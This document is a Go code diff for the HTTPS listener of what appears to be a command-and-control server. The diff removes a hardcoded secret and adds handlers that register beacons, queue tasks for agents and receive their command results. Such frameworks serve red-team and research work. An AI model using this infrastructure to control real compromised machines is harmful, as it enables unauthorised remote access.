@@ -15,7 +15,6 @@ import (
 	"github.com/gorilla/mux"
 )
 
-var SharedSecret string = "378432999013382759857861340953603067"
 var Listeners []HttpsListener
 
 type HttpsListener struct {
@@ -39,7 +38,7 @@ func NewHttps(port int) HttpsListener {
 	}
 	listener.Status = "stopped"
 	Listeners = append(Listeners, listener)
-	return listener
+	return Listeners[len(Listeners)-1]
 }
 
 func (l *HttpsListener) Start() {
@@ -79,37 +78,49 @@ func (l *HttpsListener) Stop() error {
 	return err
 }
 
+// Registers the beacon, hands a unique UUID to identify them, received some critical info about the beacons env
 func RegisterBeaconHandler(w http.ResponseWriter, r *http.Request) {
+	// Parse
 	var beacon core.Beacon
 	if err := json.NewDecoder(r.Body).Decode(&beacon); err != nil {
-		fmt.Printf("error: %v\n", err)
+		fmt.Printf("%s Json decode error: %v\n", util.PrintBad, err)
 		http.Error(w, "Invalid JSON", http.StatusBadRequest)
 		return
 	}
-
+	// Server side info
 	beacon.ID = uuid.New().String()
 	beacon.FirstSeen = time.Now()
 	beacon.LastSeen = time.Now()
 	beacon.ExternalIP = r.RemoteAddr
 
+	// push to array
 	core.Beacons = append(core.Beacons, beacon)
 
+	// Send back full json of Beacon type, most importantly uuid
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(beacon)
 }
 
+// Parses & updates "Tasks", Prints out received command result from beacon
 func PostResultsHandler(w http.ResponseWriter, r *http.Request) {
-	fmt.Println(util.PrintStatus, r.Body)
+	// Parse
+	var TaskRes core.Task
+	if err := json.NewDecoder(r.Body).Decode(&TaskRes); err != nil {
+		fmt.Printf("%s Json decode error: %v\n", util.PrintBad, err)
+		http.Error(w, "Invalid JSON", http.StatusBadRequest)
+		return
+	}
+	// Update task
 }
 
+// Sends Next Waiting Task to Agent from oldest -> latest FIFO
 func GetTasksHandler(w http.ResponseWriter, r *http.Request) {
 	beaconId := mux.Vars(r)["beaconId"]
-	beaconTasks := core.Tasks[beaconId]
 	var beaconTask core.Task
 
-	for i := 0; i < len(beaconTasks); i++ {
-		if beaconTasks[i].Status == "pending" {
-			beaconTask = beaconTasks[i]
+	for i := 0; i < len(core.Tasks); i++ {
+		if core.Tasks[i].BeaconID == beaconId && core.Tasks[i].Status == "pending" {
+			beaconTask = core.Tasks[i]
 		}
 	}
 
